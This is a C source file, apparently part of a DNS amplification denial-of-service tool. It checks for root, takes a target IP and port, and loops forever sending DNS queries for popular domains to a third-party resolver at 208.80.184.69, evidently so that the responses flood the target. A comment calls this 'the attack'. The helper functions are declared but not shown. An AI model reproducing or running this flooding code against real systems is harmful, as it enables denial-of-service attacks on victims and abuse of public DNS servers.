/*
Copyright (c) 2013, Ethan Willoner
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:
    * Redistributions of source code must retain the above copyright
      notice, this list of conditions and the following disclaimer.
    * Redistributions in binary form must reproduce the above copyright
      notice, this list of conditions and the following disclaimer in the
      documentation and/or other materials provided with the distribution.
    * Neither the name of the <organization> nor the
      names of its contributors may be used to endorse or promote products
      derived from this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY
DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/time.h>
#include <time.h>

void usage(char *str);
void error(char *str);
void dns_send(char *trgt_ip, int trgt_p, char *dns_srv, int dns_p,
	unsigned char *dns_record);

int main(int argc, char **argv)
{	
	// Initial uid check and argument count check
	if(getuid()!=0)
		error("You must be running as root!");
	if(argc<3)
		usage(argv[0]);
	
	// Assignments to variables from the given arguments
	char *trgt_ip = argv[1];
	int trgt_p = atoi(argv[2]);
	
	// This code is just an example if you want to use a list of records 
	// to resolve for the attack, or use a list of different DNS servers, etc
	//while(1)
		//dns_send(trgt_ip, trgt_p, dns_srv, 53, dns_rcrd);
	while(1) {
		dns_send(trgt_ip, trgt_p, "208.80.184.69", 53, "www.google.com");
		dns_send(trgt_ip, trgt_p, "208.80.184.69", 53, "ietf.org");
		dns_send(trgt_ip, trgt_p, "208.80.184.69", 53, "www.amazon.com");
		dns_send(trgt_ip, trgt_p, "208.80.184.69", 53, "ieee.org");
	}	
	return 0;
}

void usage(char *str)
{
	printf("%s\n target port\n", str);
	exit(0);
}
